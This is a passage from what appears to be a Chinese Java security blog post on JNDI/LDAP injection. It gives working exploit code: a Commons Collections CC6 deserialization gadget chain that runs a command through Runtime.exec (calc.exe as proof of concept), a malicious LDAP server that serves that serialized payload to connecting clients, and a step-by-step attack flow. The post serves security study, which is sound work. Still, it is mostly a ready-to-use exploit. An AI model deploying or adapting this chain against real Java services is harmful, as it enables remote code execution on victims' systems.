<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.Transformer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.functors.ChainedTransformer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.functors.ConstantTransformer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.functors.InvokerTransformer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.keyvalue.TiedMapEntry</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections.map.LazyMap</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ByteArrayOutputStream</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ObjectOutputStream</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.lang.reflect.Field</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.HashMap</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.Map</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">CC6</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">getPayload</span>() <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">fakeTransformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> {<span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">1</span>)};
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">transformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span>{
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">class</span>),
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;getMethod&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span>{<span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>, <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span>.<span style="color:#58a1dd">class</span>}, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{<span style="color:#a6be9d">&#34;getRuntime&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">0</span><span style="color:#ff636f">]</span>}),
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;invoke&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span>{<span style="color:#58a1dd">Object</span>.<span style="color:#58a1dd">class</span>, <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>.<span style="color:#58a1dd">class</span>}, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{<span style="color:#ff636f">null</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">0</span><span style="color:#ff636f">]</span>}),
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InvokerTransformer</span>(<span style="color:#a6be9d">&#34;exec&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span>{<span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>}, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span>{<span style="color:#a6be9d">&#34;calc.exe&#34;</span>}),
</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">1</span>),
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 先使用fakeTransformer防止本地命令执行</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span> <span style="color:#58a1dd">transformerChain</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ChainedTransformer</span>(<span style="color:#58a1dd">fakeTransformers</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">innerMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">outerMap</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LazyMap</span>.<span style="color:#58a1dd">decorate</span>(<span style="color:#58a1dd">innerMap</span>, <span style="color:#58a1dd">transformerChain</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TiedMapEntry</span> <span style="color:#58a1dd">tiedMapEntry</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TiedMapEntry</span>(<span style="color:#58a1dd">outerMap</span>, <span style="color:#a6be9d">&#34;keykey&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Map</span> <span style="color:#58a1dd">objMap</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">objMap</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">tiedMapEntry</span>, <span style="color:#a6be9d">&#34;valuevalue&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">outerMap</span>.<span style="color:#58a1dd">remove</span>(<span style="color:#a6be9d">&#34;keykey&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 使用反射替换transformerChain的transformers</span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Field</span> <span style="color:#58a1dd">f</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ChainedTransformer</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getDeclaredField</span>(<span style="color:#a6be9d">&#34;iTransformers&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">f</span>.<span style="color:#58a1dd">setAccessible</span>(<span style="color:#ff636f">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">f</span>.<span style="color:#58a1dd">set</span>(<span style="color:#58a1dd">transformerChain</span>, <span style="color:#58a1dd">transformers</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ByteArrayOutputStream</span> <span style="color:#58a1dd">barr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ByteArrayOutputStream</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectOutputStream</span> <span style="color:#58a1dd">oos</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectOutputStream</span>(<span style="color:#58a1dd">barr</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">writeObject</span>(<span style="color:#58a1dd">objMap</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">close</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">barr</span>.<span style="color:#58a1dd">toByteArray</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryDirectoryServer</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.InMemoryListenerConfig</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.Entry</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.LDAPResult</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.unboundid.ldap.sdk.ResultCode</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.ServerSocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.SocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.net.ssl.SSLSocketFactory</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.InetAddress</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.URL</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">LDAPSerialServer</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">final</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">LDAP_BASE</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;dc=example,dc=com&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span> ( <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">tmp_args</span> ) {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span>{<span style="color:#a6be9d">&#34;http://127.0.0.1:8000/#EvilClass&#34;</span>};
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">int</span> <span style="color:#58a1dd">port</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">7777</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">InMemoryDirectoryServerConfig</span> <span style="color:#58a1dd">config</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryDirectoryServerConfig</span>(<span style="color:#58a1dd">LDAP_BASE</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">setListenerConfigs</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryListenerConfig</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#a6be9d">&#34;listen&#34;</span>, <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">InetAddress</span>.<span style="color:#58a1dd">getByName</span>(<span style="color:#a6be9d">&#34;0.0.0.0&#34;</span>), <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">port</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">ServerSocketFactory</span>.<span style="color:#58a1dd">getDefault</span>(),
</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">SocketFactory</span>.<span style="color:#58a1dd">getDefault</span>(),
</span></span><span style="display:flex;"><span>                    (<span style="color:#58a1dd">SSLSocketFactory</span>) <span style="color:#58a1dd">SSLSocketFactory</span>.<span style="color:#58a1dd">getDefault</span>()));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">config</span>.<span style="color:#58a1dd">addInMemoryOperationInterceptor</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">OperationInterceptor</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span>(<span style="color:#58a1dd">args</span><span style="color:#ff636f">[</span> <span style="color:#58a1dd">0</span> <span style="color:#ff636f">]</span>)));
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">InMemoryDirectoryServer</span> <span style="color:#58a1dd">ds</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InMemoryDirectoryServer</span>(<span style="color:#58a1dd">config</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Listening on 0.0.0.0:&#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">port</span>); <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">ds</span>.<span style="color:#58a1dd">startListening</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">catch</span> ( <span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">OperationInterceptor</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">InMemoryOperationInterceptor</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">private</span> <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">codebase</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#58a1dd">OperationInterceptor</span> ( <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">cb</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">codebase</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">cb</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">processSearchResult</span> ( <span style="color:#58a1dd">InMemoryInterceptedSearchResult</span> <span style="color:#58a1dd">result</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">base</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">getRequest</span>().<span style="color:#58a1dd">getBaseDN</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Entry</span> <span style="color:#58a1dd">e</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Entry</span>(<span style="color:#58a1dd">base</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">sendResult</span>(<span style="color:#58a1dd">result</span>, <span style="color:#58a1dd">base</span>, <span style="color:#58a1dd">e</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">catch</span> ( <span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e1</span> ) {
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">e1</span>.<span style="color:#58a1dd">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">protected</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">sendResult</span> ( <span style="color:#58a1dd">InMemoryInterceptedSearchResult</span> <span style="color:#58a1dd">result</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">base</span>, <span style="color:#58a1dd">Entry</span> <span style="color:#58a1dd">e</span> ) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;Send LDAP reference result for &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">base</span> <span style="color:#ff636f">+</span> <span style="color:#a6be9d">&#34; return CC6 gadgets&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;javaClassName&#34;</span>, <span style="color:#a6be9d">&#34;DeserPayload&#34;</span>); <span style="color:#828b96;font-style:italic">//$NON-NLS-1$</span>
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">addAttribute</span>(<span style="color:#a6be9d">&#34;javaSerializedData&#34;</span>, <span style="color:#58a1dd">CC6</span>.<span style="color:#58a1dd">getPayload</span>());
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">sendSearchEntry</span>(<span style="color:#58a1dd">e</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">result</span>.<span style="color:#58a1dd">setResult</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">LDAPResult</span>(<span style="color:#58a1dd">0</span>, <span style="color:#58a1dd">ResultCode</span>.<span style="color:#58a1dd">SUCCESS</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><strong>完整攻击流程</strong>:</p>
<ol>
<li>运行恶意ldap server(上面的LDAPSerialServer类)</li>
<li>运行客户端发起请求(上面的LDAPClient类)</li>
<li>客户端对恶意LDAP server发送请求，获取包含javaSerializedData属性的对象</li>
<li>客户端解析对象，发现存在javaSerializedData属性，对其进行反序列化</li>
<li>触发本地反序列化链</li>
</ol>
<p>参考：</p>
<p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/"target="_blank" rel="external nofollow noopener noreferrer">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/</a></p>
<p>注入攻击总结的很好，直接拿来主义了</p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-09-02 17:33:01">Updated on 2024-09-02&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-jdk7u21/" class="post-nav-item" rel="prev" title="Java原生反序列化 JDK7u21"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java原生反序列化 JDK7u21</a>
      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-nav-item" rel="next" title="Fastjson反序列化">Fastjson反序列化<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
